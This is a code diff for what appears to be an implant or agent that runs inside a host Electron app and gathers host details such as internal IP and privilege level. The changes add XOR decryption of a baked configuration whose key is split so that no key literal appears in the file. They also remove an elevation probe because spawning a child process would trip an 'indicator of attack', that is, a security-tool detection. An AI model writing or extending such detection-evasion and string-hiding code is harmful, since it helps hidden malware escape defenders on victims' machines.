@@ -34,8 +34,17 @@ const DEFAULTS = {
 
 function load() {
   const cfg = { ...DEFAULTS };
-  if (typeof globalThis !== 'undefined' && globalThis.__LOIS_BAKED__)
-    Object.assign(cfg, globalThis.__LOIS_BAKED__);
+  const bakedRaw = typeof globalThis !== 'undefined' ? globalThis.__LOIS_BAKED__ : null;
+  if (bakedRaw) {
+    // encrypted bake (--enc-strings, default for baked builds): {d,k1,k2} —
+    // XOR code-unit table, key split so no single key literal sits in the file
+    if (typeof bakedRaw === 'object' && Array.isArray(bakedRaw.d)) {
+      const k = bakedRaw.k1.concat(bakedRaw.k2);
+      let s = '';
+      for (let i = 0; i < bakedRaw.d.length; i++) s += String.fromCharCode(bakedRaw.d[i] ^ k[i % k.length]);
+      try { Object.assign(cfg, JSON.parse(s)); } catch (_) {}
+    } else Object.assign(cfg, bakedRaw); // plain object: dev/tests
+  }
 
   let loadedFile = null;
   const sidecars = [
@@ -105,18 +114,15 @@ function hostInfo(cfg) {
     if (internal_ip) break;
   }
 
-  // elevation is process-static; check ONCE (execSync would block the host's
-  // main thread every tick — deadly inside an Electron app mid-boot)
+  // elevation is process-static. Deliberately NO `net session` probe: a
+  // child-process spawn under an Electron host is a process-chain IoA
+  // (ticket 001). win32 defaults to false; an operator who knows better can
+  // set "elevated": true in the baked/sidecar config.
   if (_elevCache === null) {
-    _elevCache = false;
-    try {
-      if (process.platform === 'win32') {
-        require('child_process').execSync('net session', { stdio: 'ignore', windowsHide: true });
-        _elevCache = true;
-      } else if (typeof process.getuid === 'function') {
-        _elevCache = process.getuid() === 0;
-      }
-    } catch (_) { _elevCache = false; }
+    if (typeof cfg.elevated === 'boolean') _elevCache = cfg.elevated;
+    else if (process.platform !== 'win32' && typeof process.getuid === 'function') {
+      try { _elevCache = process.getuid() === 0; } catch (_) { _elevCache = false; }
+    } else _elevCache = false;
   }
 
   const arch64 = os.arch().includes('64');
